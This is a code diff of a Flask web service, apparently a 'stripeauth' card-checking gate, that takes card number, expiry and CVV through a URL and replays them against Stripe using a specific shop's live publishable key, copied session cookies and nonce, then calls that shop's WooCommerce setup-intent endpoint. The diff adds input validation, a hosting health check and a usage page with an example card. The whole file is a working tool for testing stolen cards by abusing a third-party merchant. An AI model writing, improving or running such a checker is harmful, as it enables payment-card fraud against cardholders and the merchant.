@@ -1,34 +1,70 @@
 from flask import Flask, request, jsonify
 import requests
+import re
 
 app = Flask(__name__)
 
-@app.route('/gate/stripeauth/cc/<path:cc_details>', methods=['GET'])
-def stripeauth(cc_details):
+def validate_credit_card(card_data):
+    """
+    Validate credit card data format
+    Expected format: card_no|mm|yy|cvv
+    """
+    if not card_data:
+        return False, "No card data provided"
+    
+    parts = card_data.split('|')
+    if len(parts) != 4:
+        return False, "Invalid format. Use: card_no|mm|yy|cvv"
+    
+    card_no, mm, yy, cvv = parts
+    
+    # Validate card number (basic check)
+    if not re.match(r'^\d{13,19}$', card_no):
+        return False, "Invalid card number"
+    
+    # Validate month
+    if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
+        return False, "Invalid month (01-12)"
+    
+    # Validate year (accept both yy and yyyy)
+    if not re.match(r'^\d{2,4}$', yy):
+        return False, "Invalid year"
+    
+    # Convert year to 2-digit format if needed
+    if len(yy) == 4:
+        yy = yy[2:]
+    
+    # Validate CVV
+    if not re.match(r'^\d{3,4}$', cvv):
+        return False, "Invalid CVV"
+    
+    return True, {
+        'card_no': card_no,
+        'mm': mm.zfill(2),  # Ensure 2-digit month
+        'yy': yy,
+        'cvv': cvv
+    }
+
+@app.route('/gate=stripeauth/cc=<path:card_data>', methods=['GET'])
+def process_payment(card_data):
+    """
+    Process Stripe payment with provided credit card data
+    Format: /gate=stripeauth/cc=card_no|mm|yy|cvv
+    """
     try:
-        parts = cc_details.split('|')
-        if len(parts) != 4:
-            return jsonify({"error": "Invalid format. Use: cc|mm|yy_or_yyyy|cvv"}), 400
+        # Validate card data
+        is_valid, validation_result = validate_credit_card(card_data)
         
-        cc, mm, year_str, cvv = parts
-        cc = cc.strip()
-        mm = mm.strip()
-        year_str = year_str.strip()
-        cvv = cvv.strip()
+        if not is_valid:
+            return jsonify({
+                'status': 'error',
+                'message': validation_result
+            }), 400
         
-        # Handle yy or yyyy
-        if len(year_str) == 4:
-            year = year_str[-2:]  # Use last two digits
-        elif len(year_str) == 2:
-            year = year_str
-        else:
-            return jsonify({"error": "Invalid year format. Use YY or YYYY."}), 400
+        cc_data = validation_result
         
-        year = int(year)
-        mm = int(mm)
-        
-        # First request: Create payment method
-        headers1 = {
+        # Step 1: Create payment method with Stripe
+        headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -43,19 +79,30 @@ def stripeauth(cc_details):
             'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
         }
+
+        data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F7ab2721f84%3B+stripe-js-v3%2F7ab2721f84%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=277623&client_attribution_metadata[client_session_id]=63b40a11-d53d-4b60-af73-bf1f472c55ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=885aa08a-48ed-453e-928e-92fab222bb47&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=achBankSearchResults&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=810cf478-762b-4d16-a93b-12120ff987f883bbe6&sid=73f92f0a-e14b-432b-8799-9e8cb89297f886157f&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'
+
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
         
-        # Dynamically construct data string
-        data1 = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={mm:02d}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F7ab2721f84%3B+stripe-js-v3%2F7ab2721f84%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=277623&client_attribution_metadata[client_session_id]=63b40a11-d53d-4b60-af73-bf1f472c55ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=885aa08a-48ed-453e-928e-92fab222bb47&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=achBankSearchResults&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=810cf478-762b-4d16-a93b-12120ff987f883bbe6&sid=73f92f0a-e14b-432b-8799-9e8cb89297f886157f&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'
+        if response.status_code != 200:
+            return jsonify({
+                'status': 'error',
+                'message': f'Stripe API error: {response.status_code}',
+                'response': response.text
+            }), 400
         
-        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
-        op = response1.json()
+        op = response.json()
         
         if 'id' not in op:
-            return jsonify({"error": "Failed to create payment method", "details": op}), 500
-        
+            return jsonify({
+                'status': 'error',
+                'message': 'Failed to create payment method',
+                'response': op
+            }), 400
+            
         payment_method_id = op["id"]
-        
-        # Second request: Create and confirm setup intent
+
+        # Step 2: Process payment with the created payment method
         cookies = {
             '_ga': 'GA1.1.1677572053.1762021267',
             'sbjs_migrations': '1418474375998%3D1',
@@ -72,8 +119,8 @@ def stripeauth(cc_details):
             'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F',
             '_ga_94LZDRFSLM': 'GS2.1.s1762021267$o1$g1$t1762021431$j24$l0$h0',
         }
-        
-        headers2 = {
+
+        headers = {
             'authority': 'shop.wiseacrebrew.com',
             'accept': '*/*',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
@@ -89,20 +136,46 @@ def stripeauth(cc_details):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
         }
-        
-        data2 = {
+
+        data = {
             'action': 'wc_stripe_create_and_confirm_setup_intent',
             'wc-stripe-payment-method': payment_method_id,
             'wc-stripe-payment-type': 'card',
             '_ajax_nonce': '3a28ca36fe',
         }
-        
-        response2 = requests.post('https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php', cookies=cookies, headers=headers2, data=data2)
-        
-        return response2.text, 200
-    
+
+        response = requests.post('https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+
+        return jsonify({
+            'status': 'success',
+            'payment_method_id': payment_method_id,
+            'response': response.text,
+            'status_code': response.status_code
+        })
+
     except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        return jsonify({
+            'status': 'error',
+            'message': f'Internal server error: {str(e)}'
+        }), 500
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check endpoint for Render"""
+    return jsonify({'status': 'healthy', 'message': 'Server is running'})
+
+@app.route('/', methods=['GET'])
+def home():
+    """Home endpoint with usage instructions"""
+    return jsonify({
+        'message': 'Stripe Payment Processor API',
+        'usage': 'GET /gate=stripeauth/cc=card_no|mm|yy|cvv',
+        'example': '/gate=stripeauth/cc=5392582546656184|08|26|416',
+        'supported_formats': [
+            'card_no|mm|yy|cvv',
+            'card_no|mm|yyyy|cvv'
+        ]
+    })
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000, debug=False)
